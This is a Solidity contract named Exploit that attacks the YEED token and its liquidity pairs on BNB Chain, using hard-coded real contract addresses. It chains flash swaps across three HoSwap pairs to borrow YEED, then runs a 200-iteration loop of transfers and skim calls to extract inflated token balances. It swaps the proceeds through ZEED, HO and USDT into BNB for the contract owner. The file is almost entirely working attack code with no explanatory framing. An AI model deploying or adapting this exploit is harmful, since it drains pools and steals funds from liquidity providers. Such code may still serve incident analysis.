pragma solidity ^0.6.12;

import './YEED.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract Exploit {
    address public owner;

    struct Target {
        YEED yeed;
        IERC20 USDT;
        IERC20 HO;
        IERC20 ZEED;

        IUniswapV2Router02 pancakeRouter;

        IUniswapV2Pair pair1;
        IUniswapV2Pair pair2;
        IUniswapV2Pair pair3;

        IUniswapV2Pair hopair1;
        IUniswapV2Pair hopair2;
        IUniswapV2Pair hopair3;
    }

    constructor() public {
        owner = msg.sender;
    }


    function pancakeCall(address, uint256, uint256 _amount, bytes memory data) public {
        
        Target memory target;
        target.yeed = YEED(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);
        target.USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
        target.HO = IERC20(0x41515885251e724233c6cA94530d6dcf3A20dEc7);
        target.ZEED = IERC20(0xB2F53069E1555793481aAfe639F8E274f4Ec8435);

        target.pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        target.pair1 = IUniswapV2Pair(0xA7741d6b60A64b2AaE8b52186adeA77b1ca05054);  // USDT
        target.pair2 = IUniswapV2Pair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);  // ZEED
        target.pair3 = IUniswapV2Pair(0xbC70FA7aea50B5AD54Df1edD7Ed31601C350A91a);  // HO

        target.hopair1 = IUniswapV2Pair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);  // USDT
        target.hopair2 = IUniswapV2Pair(0x14b4D3f378D859c8f7844DB21d8D95C7016cC76d);
        target.hopair3 = IUniswapV2Pair(0x6A15B419e03d9546b67715cD28c972B0219A6Fd8);

        if (msg.sender == owner) {

            (, uint256 r1, ) = target.hopair1.getReserves();
            target.hopair1.swap(0, r1-1, address(this), data);  // borrow YEED in pair1

            // TODO: swap remaining YEED from xxx to BNB
            
            uint256 p = target.yeed.balanceOf(address(this)) / 3;
            IUniswapV2Router02 hoRouter = IUniswapV2Router02(0x6CD71A07E72C514f5d511651F6808c6395353968);

            target.yeed.approve(address(hoRouter), uint(-1));
            target.USDT.approve(address(target.pancakeRouter), uint(-1));
            target.ZEED.approve(address(target.pancakeRouter), uint(-1));

            address[] memory path2 = new address[](2);
            address[] memory path3 = new address[](3);

            // YEED to ZEED (HoSwap)
            path2[0] = address(target.yeed);
            path2[1] = address(target.ZEED);
            hoRouter.swapExactTokensForTokens(p, 0, path2, address(this), now);

            // YEED to USDT (HoSwap)
            path2[1] = address(target.USDT);
            hoRouter.swapExactTokensForTokens(p, 0, path2, address(this), now);

            // ZEED to USDT (PancakeSwap)
            path2[0] = address(target.ZEED);
            path2[1] = address(target.USDT);
            target.pancakeRouter.swapExactTokensForTokens(target.ZEED.balanceOf(address(this)), 0, path2, address(this), now);

            // YEED to HO
            path3[0] = address(target.yeed);
            path3[1] = address(target.HO);
            path3[2] = address(target.USDT);
            hoRouter.swapExactTokensForTokens(p, 0, path3, address(this), now);

            // USDT to BNB (PancakeSwap)
            path2[0] = address(target.USDT);
            path2[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
            target.pancakeRouter.swapExactTokensForETH(target.USDT.balanceOf(address(this)), 0, path2, owner, now);
            
        } else if (msg.sender == address(target.hopair1)) {

            (, uint256 r2, ) = target.hopair2.getReserves();
            target.hopair2.swap(0, r2-1, address(this), data);  // borrow YEED in pair2
            target.yeed.transfer(address(target.hopair1), _amount * 1000 / 997 + 1);  // give back for p1


        } else if (msg.sender == address(target.hopair2)) {

            (, uint256 r3, ) = target.hopair3.getReserves();
            target.hopair3.swap(0, r3-1, address(this), data);  // borrow YEED in pair3
            target.yeed.transfer(address(target.hopair2), _amount * 1000 / 997 + 1);  // give back for p2


        } else if (msg.sender == address(target.hopair3)) {

            uint256 yeed_balance;
            for (uint i = 0; i < 200; i++) {
                yeed_balance = target.yeed.balanceOf(address(this));
                target.yeed.transfer(address(target.pair1), yeed_balance);
                target.pair1.skim(address(this));
                target.pair2.skim(address(this));
                target.pair3.skim(address(this));
            }
            target.yeed.transfer(address(target.hopair3), _amount * 1000 / 997 + 1);  // give back for p3

        }
    }
}
